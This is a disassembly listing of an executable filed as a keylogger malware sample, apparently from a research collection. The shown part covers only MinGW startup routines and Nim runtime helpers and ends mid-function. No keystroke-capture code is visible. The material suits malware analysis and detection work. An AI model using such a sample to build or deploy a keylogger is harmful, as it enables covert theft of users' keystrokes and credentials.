
malware_samples/keylogger/e54f8994184ecd6af6c66f39a56aa7a3a001bbc450bee656a13c4c962df82a86.exe:     file format pei-x86-64


Disassembly of section .text:

0000000000401000 <__mingw_invalidParameterHandler>:
  401000:	c3                   	ret
  401001:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40100d:	00 00 00 

0000000000401010 <pre_c_init>:
  401010:	48 83 ec 28          	sub    $0x28,%rsp
  401014:	48 8b 05 05 0e 01 00 	mov    0x10e05(%rip),%rax        # 411e20 <.refptr.mingw_initltsdrot_force>
  40101b:	31 d2                	xor    %edx,%edx
  40101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401023:	48 8b 05 06 0e 01 00 	mov    0x10e06(%rip),%rax        # 411e30 <.refptr.mingw_initltsdyn_force>
  40102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  401030:	48 8b 05 09 0e 01 00 	mov    0x10e09(%rip),%rax        # 411e40 <.refptr.mingw_initltssuo_force>
  401037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40103d:	48 8b 05 cc 0d 01 00 	mov    0x10dcc(%rip),%rax        # 411e10 <.refptr.mingw_initcharmax>
  401044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  40104a:	48 8b 05 af 0c 01 00 	mov    0x10caf(%rip),%rax        # 411d00 <.refptr.__image_base__>
  401051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
  401056:	74 58                	je     4010b0 <pre_c_init+0xa0>
  401058:	48 8b 05 a1 0d 01 00 	mov    0x10da1(%rip),%rax        # 411e00 <.refptr.mingw_app_type>
  40105f:	89 15 a3 2f 01 00    	mov    %edx,0x12fa3(%rip)        # 414008 <managedapp>
  401065:	8b 00                	mov    (%rax),%eax
  401067:	85 c0                	test   %eax,%eax
  401069:	74 35                	je     4010a0 <pre_c_init+0x90>
  40106b:	b9 02 00 00 00       	mov    $0x2,%ecx
  401070:	e8 23 74 00 00       	call   408498 <__set_app_type>
  401075:	e8 96 74 00 00       	call   408510 <__p__fmode>
  40107a:	48 8b 15 3f 0d 01 00 	mov    0x10d3f(%rip),%rdx        # 411dc0 <.refptr._fmode>
  401081:	8b 12                	mov    (%rdx),%edx
  401083:	89 10                	mov    %edx,(%rax)
  401085:	e8 66 5f 00 00       	call   406ff0 <_setargv>
  40108a:	48 8b 05 1f 0c 01 00 	mov    0x10c1f(%rip),%rax        # 411cb0 <.refptr._MINGW_INSTALL_DEBUG_MATHERR>
  401091:	83 38 01             	cmpl   $0x1,(%rax)
  401094:	74 5a                	je     4010f0 <pre_c_init+0xe0>
  401096:	31 c0                	xor    %eax,%eax
  401098:	48 83 c4 28          	add    $0x28,%rsp
  40109c:	c3                   	ret
  40109d:	0f 1f 00             	nopl   (%rax)
  4010a0:	b9 01 00 00 00       	mov    $0x1,%ecx
  4010a5:	e8 ee 73 00 00       	call   408498 <__set_app_type>
  4010aa:	eb c9                	jmp    401075 <pre_c_init+0x65>
  4010ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4010b0:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
  4010b4:	48 01 c8             	add    %rcx,%rax
  4010b7:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
  4010bd:	75 99                	jne    401058 <pre_c_init+0x48>
  4010bf:	0f b7 48 18          	movzwl 0x18(%rax),%ecx
  4010c3:	66 81 f9 0b 01       	cmp    $0x10b,%cx
  4010c8:	74 39                	je     401103 <pre_c_init+0xf3>
  4010ca:	66 81 f9 0b 02       	cmp    $0x20b,%cx
  4010cf:	75 87                	jne    401058 <pre_c_init+0x48>
  4010d1:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
  4010d8:	0f 86 7a ff ff ff    	jbe    401058 <pre_c_init+0x48>
  4010de:	8b 88 f8 00 00 00    	mov    0xf8(%rax),%ecx
  4010e4:	31 d2                	xor    %edx,%edx
  4010e6:	85 c9                	test   %ecx,%ecx
  4010e8:	0f 95 c2             	setne  %dl
  4010eb:	e9 68 ff ff ff       	jmp    401058 <pre_c_init+0x48>
  4010f0:	48 8d 0d 09 62 00 00 	lea    0x6209(%rip),%rcx        # 407300 <_matherr>
  4010f7:	e8 f4 61 00 00       	call   4072f0 <__mingw_setusermatherr>
  4010fc:	31 c0                	xor    %eax,%eax
  4010fe:	48 83 c4 28          	add    $0x28,%rsp
  401102:	c3                   	ret
  401103:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
  401107:	0f 86 4b ff ff ff    	jbe    401058 <pre_c_init+0x48>
  40110d:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
  401114:	31 d2                	xor    %edx,%edx
  401116:	45 85 c0             	test   %r8d,%r8d
  401119:	0f 95 c2             	setne  %dl
  40111c:	e9 37 ff ff ff       	jmp    401058 <pre_c_init+0x48>
  401121:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401126:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40112d:	00 00 00 

0000000000401130 <pre_cpp_init>:
  401130:	48 83 ec 38          	sub    $0x38,%rsp
  401134:	48 8b 05 b5 0c 01 00 	mov    0x10cb5(%rip),%rax        # 411df0 <.refptr._newmode>
  40113b:	4c 8d 05 ce 2e 01 00 	lea    0x12ece(%rip),%r8        # 414010 <envp>
  401142:	48 8d 15 cf 2e 01 00 	lea    0x12ecf(%rip),%rdx        # 414018 <argv>
  401149:	48 8d 0d d0 2e 01 00 	lea    0x12ed0(%rip),%rcx        # 414020 <argc>
  401150:	8b 00                	mov    (%rax),%eax
  401152:	89 05 a8 2e 01 00    	mov    %eax,0x12ea8(%rip)        # 414000 <__bss_start__>
  401158:	48 8d 05 a1 2e 01 00 	lea    0x12ea1(%rip),%rax        # 414000 <__bss_start__>
  40115f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  401164:	48 8b 05 45 0c 01 00 	mov    0x10c45(%rip),%rax        # 411db0 <.refptr._dowildcard>
  40116b:	44 8b 08             	mov    (%rax),%r9d
  40116e:	e8 35 73 00 00       	call   4084a8 <__getmainargs>
  401173:	90                   	nop
  401174:	48 83 c4 38          	add    $0x38,%rsp
  401178:	c3                   	ret
  401179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401180 <__tmainCRTStartup>:
  401180:	41 55                	push   %r13
  401182:	41 54                	push   %r12
  401184:	55                   	push   %rbp
  401185:	57                   	push   %rdi
  401186:	56                   	push   %rsi
  401187:	53                   	push   %rbx
  401188:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
  40118f:	31 c0                	xor    %eax,%eax
  401191:	b9 0d 00 00 00       	mov    $0xd,%ecx
  401196:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  40119b:	48 89 d7             	mov    %rdx,%rdi
  40119e:	f3 48 ab             	rep stos %rax,(%rdi)
  4011a1:	48 8b 3d 58 0c 01 00 	mov    0x10c58(%rip),%rdi        # 411e00 <.refptr.mingw_app_type>
  4011a8:	44 8b 0f             	mov    (%rdi),%r9d
  4011ab:	45 85 c9             	test   %r9d,%r9d
  4011ae:	0f 85 bc 02 00 00    	jne    401470 <__tmainCRTStartup+0x2f0>
  4011b4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
  4011bb:	00 00 
  4011bd:	48 8b 1d 8c 0b 01 00 	mov    0x10b8c(%rip),%rbx        # 411d50 <.refptr.__native_startup_lock>
  4011c4:	31 ed                	xor    %ebp,%ebp
  4011c6:	48 8b 70 08          	mov    0x8(%rax),%rsi
  4011ca:	4c 8b 25 33 71 04 00 	mov    0x47133(%rip),%r12        # 448304 <__imp_Sleep>
  4011d1:	eb 11                	jmp    4011e4 <__tmainCRTStartup+0x64>
  4011d3:	48 39 c6             	cmp    %rax,%rsi
  4011d6:	0f 84 34 02 00 00    	je     401410 <__tmainCRTStartup+0x290>
  4011dc:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4011e1:	41 ff d4             	call   *%r12
  4011e4:	48 89 e8             	mov    %rbp,%rax
  4011e7:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
  4011ec:	48 85 c0             	test   %rax,%rax
  4011ef:	75 e2                	jne    4011d3 <__tmainCRTStartup+0x53>
  4011f1:	48 8b 35 68 0b 01 00 	mov    0x10b68(%rip),%rsi        # 411d60 <.refptr.__native_startup_state>
  4011f8:	31 ed                	xor    %ebp,%ebp
  4011fa:	8b 06                	mov    (%rsi),%eax
  4011fc:	83 f8 01             	cmp    $0x1,%eax
  4011ff:	0f 84 22 02 00 00    	je     401427 <__tmainCRTStartup+0x2a7>
  401205:	8b 06                	mov    (%rsi),%eax
  401207:	85 c0                	test   %eax,%eax
  401209:	0f 84 71 02 00 00    	je     401480 <__tmainCRTStartup+0x300>
  40120f:	c7 05 eb 2d 01 00 01 	movl   $0x1,0x12deb(%rip)        # 414004 <has_cctor>
  401216:	00 00 00 
  401219:	8b 06                	mov    (%rsi),%eax
  40121b:	83 f8 01             	cmp    $0x1,%eax
  40121e:	0f 84 18 02 00 00    	je     40143c <__tmainCRTStartup+0x2bc>
  401224:	85 ed                	test   %ebp,%ebp
  401226:	0f 84 31 02 00 00    	je     40145d <__tmainCRTStartup+0x2dd>
  40122c:	48 8b 05 bd 0a 01 00 	mov    0x10abd(%rip),%rax        # 411cf0 <.refptr.__dyn_tls_init_callback>
  401233:	48 8b 00             	mov    (%rax),%rax
  401236:	48 85 c0             	test   %rax,%rax
  401239:	74 0c                	je     401247 <__tmainCRTStartup+0xc7>
  40123b:	45 31 c0             	xor    %r8d,%r8d
  40123e:	ba 02 00 00 00       	mov    $0x2,%edx
  401243:	31 c9                	xor    %ecx,%ecx
  401245:	ff d0                	call   *%rax
  401247:	e8 b4 63 00 00       	call   407600 <_pei386_runtime_relocator>
  40124c:	48 8d 0d fd 68 00 00 	lea    0x68fd(%rip),%rcx        # 407b50 <_gnu_exception_handler>
  401253:	ff 15 a3 70 04 00    	call   *0x470a3(%rip)        # 4482fc <__imp_SetUnhandledExceptionFilter>
  401259:	48 8b 15 e0 0a 01 00 	mov    0x10ae0(%rip),%rdx        # 411d40 <.refptr.__mingw_oldexcpt_handler>
  401260:	48 89 02             	mov    %rax,(%rdx)
  401263:	e8 f8 67 00 00       	call   407a60 <__mingw_init_ehandler>
  401268:	48 8d 0d 91 fd ff ff 	lea    -0x26f(%rip),%rcx        # 401000 <__mingw_invalidParameterHandler>
  40126f:	e8 7c 72 00 00       	call   4084f0 <_set_invalid_parameter_handler>
  401274:	e8 87 61 00 00       	call   407400 <_fpreset>
  401279:	48 8b 05 80 0a 01 00 	mov    0x10a80(%rip),%rax        # 411d00 <.refptr.__image_base__>
  401280:	48 89 05 e1 d8 02 00 	mov    %rax,0x2d8e1(%rip)        # 42eb68 <__mingw_winmain_hInstance>
  401287:	e8 74 72 00 00       	call   408500 <__p__acmdln>
  40128c:	31 c9                	xor    %ecx,%ecx
  40128e:	48 8b 00             	mov    (%rax),%rax
  401291:	48 85 c0             	test   %rax,%rax
  401294:	75 1c                	jne    4012b2 <__tmainCRTStartup+0x132>
  401296:	eb 5f                	jmp    4012f7 <__tmainCRTStartup+0x177>
  401298:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40129f:	00 
  4012a0:	84 d2                	test   %dl,%dl
  4012a2:	74 2c                	je     4012d0 <__tmainCRTStartup+0x150>
  4012a4:	83 e1 01             	and    $0x1,%ecx
  4012a7:	74 27                	je     4012d0 <__tmainCRTStartup+0x150>
  4012a9:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012ae:	48 83 c0 01          	add    $0x1,%rax
  4012b2:	0f b6 10             	movzbl (%rax),%edx
  4012b5:	80 fa 20             	cmp    $0x20,%dl
  4012b8:	7e e6                	jle    4012a0 <__tmainCRTStartup+0x120>
  4012ba:	41 89 c8             	mov    %ecx,%r8d
  4012bd:	41 83 f0 01          	xor    $0x1,%r8d
  4012c1:	80 fa 22             	cmp    $0x22,%dl
  4012c4:	41 0f 44 c8          	cmove  %r8d,%ecx
  4012c8:	eb e4                	jmp    4012ae <__tmainCRTStartup+0x12e>
  4012ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4012d0:	84 d2                	test   %dl,%dl
  4012d2:	75 11                	jne    4012e5 <__tmainCRTStartup+0x165>
  4012d4:	eb 1a                	jmp    4012f0 <__tmainCRTStartup+0x170>
  4012d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4012dd:	00 00 00 
  4012e0:	80 fa 20             	cmp    $0x20,%dl
  4012e3:	7f 0b                	jg     4012f0 <__tmainCRTStartup+0x170>
  4012e5:	48 83 c0 01          	add    $0x1,%rax
  4012e9:	0f b6 10             	movzbl (%rax),%edx
  4012ec:	84 d2                	test   %dl,%dl
  4012ee:	75 f0                	jne    4012e0 <__tmainCRTStartup+0x160>
  4012f0:	48 89 05 69 d8 02 00 	mov    %rax,0x2d869(%rip)        # 42eb60 <__mingw_winmain_lpCmdLine>
  4012f7:	44 8b 07             	mov    (%rdi),%r8d
  4012fa:	45 85 c0             	test   %r8d,%r8d
  4012fd:	74 16                	je     401315 <__tmainCRTStartup+0x195>
  4012ff:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
  401304:	b8 0a 00 00 00       	mov    $0xa,%eax
  401309:	0f 85 f1 00 00 00    	jne    401400 <__tmainCRTStartup+0x280>
  40130f:	89 05 eb 9c 00 00    	mov    %eax,0x9ceb(%rip)        # 40b000 <__data_start__>
  401315:	8b 1d 05 2d 01 00    	mov    0x12d05(%rip),%ebx        # 414020 <argc>
  40131b:	44 8d 63 01          	lea    0x1(%rbx),%r12d
  40131f:	4d 63 e4             	movslq %r12d,%r12
  401322:	49 c1 e4 03          	shl    $0x3,%r12
  401326:	4c 89 e1             	mov    %r12,%rcx
  401329:	e8 e2 70 00 00       	call   408410 <malloc>
  40132e:	85 db                	test   %ebx,%ebx
  401330:	48 8b 3d e1 2c 01 00 	mov    0x12ce1(%rip),%rdi        # 414018 <argv>
  401337:	48 89 c5             	mov    %rax,%rbp
  40133a:	7e 4b                	jle    401387 <__tmainCRTStartup+0x207>
  40133c:	8d 43 ff             	lea    -0x1(%rbx),%eax
  40133f:	31 db                	xor    %ebx,%ebx
  401341:	4c 8d 2c c5 08 00 00 	lea    0x8(,%rax,8),%r13
  401348:	00 
  401349:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401350:	48 8b 0c 1f          	mov    (%rdi,%rbx,1),%rcx
  401354:	e8 9f 70 00 00       	call   4083f8 <strlen>
  401359:	48 8d 70 01          	lea    0x1(%rax),%rsi
  40135d:	48 89 f1             	mov    %rsi,%rcx
  401360:	e8 ab 70 00 00       	call   408410 <malloc>
  401365:	49 89 f0             	mov    %rsi,%r8
  401368:	48 89 44 1d 00       	mov    %rax,0x0(%rbp,%rbx,1)
  40136d:	48 8b 14 1f          	mov    (%rdi,%rbx,1),%rdx
  401371:	48 89 c1             	mov    %rax,%rcx
  401374:	48 83 c3 08          	add    $0x8,%rbx
  401378:	e8 8b 70 00 00       	call   408408 <memcpy>
  40137d:	49 39 dd             	cmp    %rbx,%r13
  401380:	75 ce                	jne    401350 <__tmainCRTStartup+0x1d0>
  401382:	4a 8d 44 25 f8       	lea    -0x8(%rbp,%r12,1),%rax
  401387:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  40138e:	48 89 2d 83 2c 01 00 	mov    %rbp,0x12c83(%rip)        # 414018 <argv>
  401395:	e8 26 5c 00 00       	call   406fc0 <__main>
  40139a:	48 8b 05 6f 09 01 00 	mov    0x1096f(%rip),%rax        # 411d10 <.refptr.__imp___initenv>
  4013a1:	48 8b 15 68 2c 01 00 	mov    0x12c68(%rip),%rdx        # 414010 <envp>
  4013a8:	8b 0d 72 2c 01 00    	mov    0x12c72(%rip),%ecx        # 414020 <argc>
  4013ae:	48 8b 00             	mov    (%rax),%rax
  4013b1:	48 89 10             	mov    %rdx,(%rax)
  4013b4:	4c 8b 05 55 2c 01 00 	mov    0x12c55(%rip),%r8        # 414010 <envp>
  4013bb:	48 8b 15 56 2c 01 00 	mov    0x12c56(%rip),%rdx        # 414018 <argv>
  4013c2:	e8 89 72 00 00       	call   408650 <main>
  4013c7:	8b 0d 3b 2c 01 00    	mov    0x12c3b(%rip),%ecx        # 414008 <managedapp>
  4013cd:	89 05 39 2c 01 00    	mov    %eax,0x12c39(%rip)        # 41400c <mainret>
  4013d3:	85 c9                	test   %ecx,%ecx
  4013d5:	0f 84 c3 00 00 00    	je     40149e <__tmainCRTStartup+0x31e>
  4013db:	8b 15 23 2c 01 00    	mov    0x12c23(%rip),%edx        # 414004 <has_cctor>
  4013e1:	85 d2                	test   %edx,%edx
  4013e3:	75 0b                	jne    4013f0 <__tmainCRTStartup+0x270>
  4013e5:	e8 96 70 00 00       	call   408480 <_cexit>
  4013ea:	8b 05 1c 2c 01 00    	mov    0x12c1c(%rip),%eax        # 41400c <mainret>
  4013f0:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  4013f7:	5b                   	pop    %rbx
  4013f8:	5e                   	pop    %rsi
  4013f9:	5f                   	pop    %rdi
  4013fa:	5d                   	pop    %rbp
  4013fb:	41 5c                	pop    %r12
  4013fd:	41 5d                	pop    %r13
  4013ff:	c3                   	ret
  401400:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
  401405:	e9 05 ff ff ff       	jmp    40130f <__tmainCRTStartup+0x18f>
  40140a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401410:	48 8b 35 49 09 01 00 	mov    0x10949(%rip),%rsi        # 411d60 <.refptr.__native_startup_state>
  401417:	bd 01 00 00 00       	mov    $0x1,%ebp
  40141c:	8b 06                	mov    (%rsi),%eax
  40141e:	83 f8 01             	cmp    $0x1,%eax
  401421:	0f 85 de fd ff ff    	jne    401205 <__tmainCRTStartup+0x85>
  401427:	b9 1f 00 00 00       	mov    $0x1f,%ecx
  40142c:	e8 57 70 00 00       	call   408488 <_amsg_exit>
  401431:	8b 06                	mov    (%rsi),%eax
  401433:	83 f8 01             	cmp    $0x1,%eax
  401436:	0f 85 e8 fd ff ff    	jne    401224 <__tmainCRTStartup+0xa4>
  40143c:	48 8b 15 3d 09 01 00 	mov    0x1093d(%rip),%rdx        # 411d80 <.refptr.__xc_z>
  401443:	48 8b 0d 26 09 01 00 	mov    0x10926(%rip),%rcx        # 411d70 <.refptr.__xc_a>
  40144a:	e8 21 70 00 00       	call   408470 <_initterm>
  40144f:	85 ed                	test   %ebp,%ebp
  401451:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
  401457:	0f 85 cf fd ff ff    	jne    40122c <__tmainCRTStartup+0xac>
  40145d:	31 c0                	xor    %eax,%eax
  40145f:	48 87 03             	xchg   %rax,(%rbx)
  401462:	e9 c5 fd ff ff       	jmp    40122c <__tmainCRTStartup+0xac>
  401467:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40146e:	00 00 
  401470:	48 89 d1             	mov    %rdx,%rcx
  401473:	ff 15 23 6e 04 00    	call   *0x46e23(%rip)        # 44829c <__imp_GetStartupInfoA>
  401479:	e9 36 fd ff ff       	jmp    4011b4 <__tmainCRTStartup+0x34>
  40147e:	66 90                	xchg   %ax,%ax
  401480:	48 8b 15 19 09 01 00 	mov    0x10919(%rip),%rdx        # 411da0 <.refptr.__xi_z>
  401487:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
  40148d:	48 8b 0d fc 08 01 00 	mov    0x108fc(%rip),%rcx        # 411d90 <.refptr.__xi_a>
  401494:	e8 d7 6f 00 00       	call   408470 <_initterm>
  401499:	e9 7b fd ff ff       	jmp    401219 <__tmainCRTStartup+0x99>
  40149e:	89 c1                	mov    %eax,%ecx
  4014a0:	e8 9b 6f 00 00       	call   408440 <exit>
  4014a5:	90                   	nop
  4014a6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014ad:	00 00 00 

00000000004014b0 <WinMainCRTStartup>:
  4014b0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014b4 <.l_startw>:
  4014b4:	48 8b 05 45 09 01 00 	mov    0x10945(%rip),%rax        # 411e00 <.refptr.mingw_app_type>
  4014bb:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
  4014c1:	e8 3a 5b 00 00       	call   407000 <__security_init_cookie>
  4014c6:	e8 b5 fc ff ff       	call   401180 <__tmainCRTStartup>
  4014cb:	90                   	nop

00000000004014cc <.l_endw>:
  4014cc:	90                   	nop
  4014cd:	48 83 c4 28          	add    $0x28,%rsp
  4014d1:	c3                   	ret
  4014d2:	0f 1f 40 00          	nopl   0x0(%rax)
  4014d6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4014dd:	00 00 00 

00000000004014e0 <mainCRTStartup>:
  4014e0:	48 83 ec 28          	sub    $0x28,%rsp

00000000004014e4 <.l_start>:
  4014e4:	48 8b 05 15 09 01 00 	mov    0x10915(%rip),%rax        # 411e00 <.refptr.mingw_app_type>
  4014eb:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  4014f1:	e8 0a 5b 00 00       	call   407000 <__security_init_cookie>
  4014f6:	e8 85 fc ff ff       	call   401180 <__tmainCRTStartup>
  4014fb:	90                   	nop

00000000004014fc <.l_end>:
  4014fc:	90                   	nop
  4014fd:	48 83 c4 28          	add    $0x28,%rsp
  401501:	c3                   	ret
  401502:	0f 1f 40 00          	nopl   0x0(%rax)
  401506:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40150d:	00 00 00 

0000000000401510 <atexit>:
  401510:	48 83 ec 28          	sub    $0x28,%rsp
  401514:	e8 4f 6f 00 00       	call   408468 <_onexit>
  401519:	48 85 c0             	test   %rax,%rax
  40151c:	0f 94 c0             	sete   %al
  40151f:	0f b6 c0             	movzbl %al,%eax
  401522:	f7 d8                	neg    %eax
  401524:	48 83 c4 28          	add    $0x28,%rsp
  401528:	c3                   	ret
  401529:	90                   	nop
  40152a:	90                   	nop
  40152b:	90                   	nop
  40152c:	90                   	nop
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop

0000000000401530 <__gcc_register_frame>:
  401530:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 401540 <__gcc_deregister_frame>
  401537:	e9 d4 ff ff ff       	jmp    401510 <atexit>
  40153c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401540 <__gcc_deregister_frame>:
  401540:	c3                   	ret
  401541:	90                   	nop
  401542:	90                   	nop
  401543:	90                   	nop
  401544:	90                   	nop
  401545:	90                   	nop
  401546:	90                   	nop
  401547:	90                   	nop
  401548:	90                   	nop
  401549:	90                   	nop
  40154a:	90                   	nop
  40154b:	90                   	nop
  40154c:	90                   	nop
  40154d:	90                   	nop
  40154e:	90                   	nop
  40154f:	90                   	nop

0000000000401550 <Marker_tyRef__4HwedE75WPfqZSQ0Cq2OUg>:
  401550:	c3                   	ret

0000000000401551 <nimToCStringConv.lto_priv.52>:
  401551:	48 8d 05 a8 aa 00 00 	lea    0xaaa8(%rip),%rax        # 40c000 <.rdata>
  401558:	48 85 c9             	test   %rcx,%rcx
  40155b:	74 0a                	je     401567 <nimToCStringConv.lto_priv.52+0x16>
  40155d:	48 83 39 00          	cmpq   $0x0,(%rcx)
  401561:	74 04                	je     401567 <nimToCStringConv.lto_priv.52+0x16>
  401563:	48 8d 41 10          	lea    0x10(%rcx),%rax
  401567:	c3                   	ret

0000000000401568 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71>:
  401568:	48 85 c9             	test   %rcx,%rcx
  40156b:	74 08                	je     401575 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71+0xd>
  40156d:	48 83 39 00          	cmpq   $0x0,(%rcx)
  401571:	74 02                	je     401575 <amp___aQWwfRzjgGaDTaTDjMS9cmgwinstr.lto_priv.71+0xd>
  401573:	eb dc                	jmp    401551 <nimToCStringConv.lto_priv.52>
  401575:	48 8d 05 85 aa 00 00 	lea    0xaa85(%rip),%rax        # 40c001 <.rdata+0x1>
  40157c:	c3                   	ret

000000000040157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>:
  40157d:	48 83 ec 68          	sub    $0x68,%rsp
  401581:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  401587:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
  40158c:	48 c7 02 00 00 00 00 	movq   $0x0,(%rdx)
  401593:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  40159a:	00 
  40159b:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  4015a0:	ba 06 00 00 c8       	mov    $0xc8000006,%edx
  4015a5:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
  4015ac:	00 00 
  4015ae:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  4015b5:	00 00 
  4015b7:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4015bc:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
  4015c3:	00 
  4015c4:	ff 15 4e 86 02 00    	call   *0x2864e(%rip)        # 429c18 <Dl_14040067_>
  4015ca:	85 c0                	test   %eax,%eax
  4015cc:	0f 94 c0             	sete   %al
  4015cf:	48 83 c4 68          	add    $0x68,%rsp
  4015d3:	c3                   	ret

00000000004015d4 <Marker_tySequence__6H5Oh5UUvVCLiakt9aTwtUQ>:
  4015d4:	c3                   	ret

00000000004015d5 <Marker_tySequence__8Np6tlClE5az1CyqZdN19bQ>:
  4015d5:	c3                   	ret

00000000004015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>:
  4015d6:	48 ff 25 4b 86 02 00 	rex.W jmp *0x2864b(%rip)        # 429c28 <Dl_14036830_>

00000000004015dd <resize__cOCDWr16YD4j3dBrbbH3yQsystem>:
  4015dd:	b8 04 00 00 00       	mov    $0x4,%eax
  4015e2:	48 85 c9             	test   %rcx,%rcx
  4015e5:	74 16                	je     4015fd <resize__cOCDWr16YD4j3dBrbbH3yQsystem+0x20>
  4015e7:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
  4015eb:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
  4015ef:	48 d1 f8             	sar    $1,%rax
  4015f2:	48 81 f9 ff ff 00 00 	cmp    $0xffff,%rcx
  4015f9:	48 0f 4e c2          	cmovle %rdx,%rax
  4015fd:	c3                   	ret

00000000004015fe <stackSize__VOU3z9bbtHMYBiCVB5tMX1g>:
  4015fe:	48 83 ec 18          	sub    $0x18,%rsp
  401602:	48 c7 44 24 08 00 00 	movq   $0x0,0x8(%rsp)
  401609:	00 00 
  40160b:	48 8d 44 24 08       	lea    0x8(%rsp),%rax
  401610:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  401615:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  40161a:	31 c0                	xor    %eax,%eax
  40161c:	48 85 d2             	test   %rdx,%rdx
  40161f:	74 0b                	je     40162c <stackSize__VOU3z9bbtHMYBiCVB5tMX1g+0x2e>
  401621:	48 8b 54 24 08       	mov    0x8(%rsp),%rdx
  401626:	48 8b 01             	mov    (%rcx),%rax
  401629:	48 29 d0             	sub    %rdx,%rax
  40162c:	48 83 c4 18          	add    $0x18,%rsp
  401630:	c3                   	ret

0000000000401631 <Marker_tySequence__uB9b75OUPRENsBAu4AnoePA>:
  401631:	c3                   	ret

0000000000401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>:
  401632:	4c 8b 49 08          	mov    0x8(%rcx),%r9
  401636:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  40163a:	49 89 d0             	mov    %rdx,%r8
  40163d:	4d 21 c8             	and    %r9,%r8
  401640:	4a 8b 04 c1          	mov    (%rcx,%r8,8),%rax
  401644:	48 85 c0             	test   %rax,%rax
  401647:	74 12                	je     40165b <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0x29>
  401649:	48 39 50 08          	cmp    %rdx,0x8(%rax)
  40164d:	74 0c                	je     40165b <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0x29>
  40164f:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
  401653:	49 ff c0             	inc    %r8
  401656:	4d 21 c8             	and    %r9,%r8
  401659:	eb e5                	jmp    401640 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ+0xe>
  40165b:	c3                   	ret

000000000040165c <contains__ClLkUQKF8KrRxQPdAJDd5w>:
  40165c:	48 83 ec 28          	sub    $0x28,%rsp
  401660:	49 89 d2             	mov    %rdx,%r10
  401663:	48 c1 ea 0c          	shr    $0xc,%rdx
  401667:	e8 c6 ff ff ff       	call   401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>
  40166c:	31 d2                	xor    %edx,%edx
  40166e:	48 85 c0             	test   %rax,%rax
  401671:	74 24                	je     401697 <contains__ClLkUQKF8KrRxQPdAJDd5w+0x3b>
  401673:	4c 89 d1             	mov    %r10,%rcx
  401676:	ba 01 00 00 00       	mov    $0x1,%edx
  40167b:	48 c1 e9 03          	shr    $0x3,%rcx
  40167f:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  401685:	49 89 c8             	mov    %rcx,%r8
  401688:	48 d3 e2             	shl    %cl,%rdx
  40168b:	49 c1 e8 06          	shr    $0x6,%r8
  40168f:	4a 85 54 c0 10       	test   %rdx,0x10(%rax,%r8,8)
